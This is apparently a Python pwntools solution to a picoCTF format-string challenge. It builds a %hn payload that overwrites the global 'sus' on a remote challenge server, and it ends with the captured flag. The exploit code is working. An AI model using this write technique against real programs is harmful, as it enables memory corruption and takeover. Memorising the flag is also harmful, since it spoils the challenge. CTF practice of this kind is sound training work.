#!/usr/bin/env python3 
from pwn import * 

elf = ELF("./vuln")
p = process(elf.path)
p = remote("rhea.picoctf.net", 53723)

pause()

sus = elf.symbols["sus"]
pack = { 
    0x6c66: sus,
    0x6761: sus + 2 
}
pack_sorted = sorted(pack) 

payload = f'%{pack_sorted[0]}c%19$hn'.encode() 
payload += f'%{pack_sorted[1] - pack_sorted[0]}c%20$hn'.encode()
payload = payload.ljust(40, b'A')
payload += p64(pack[pack_sorted[0]]) 
payload += p64(pack[pack_sorted[1]])

# payload = (f'%{0x6761}c%19$hn'.encode() + f'%{0x6c66 - 0x6761}c%20$hn'.encode()).ljust(40, b'A') + p64(sus + 2) + p64(sus)
p.sendlineafter(b'say?\n', payload)
# p.recvuntil(b'go...\n')
# log.success(p.recvline().decode())
# print(p.recvline())

p.interactive()

# picoCTF{f0rm47_57r?_f0rm47_m3m_d42f4d8d}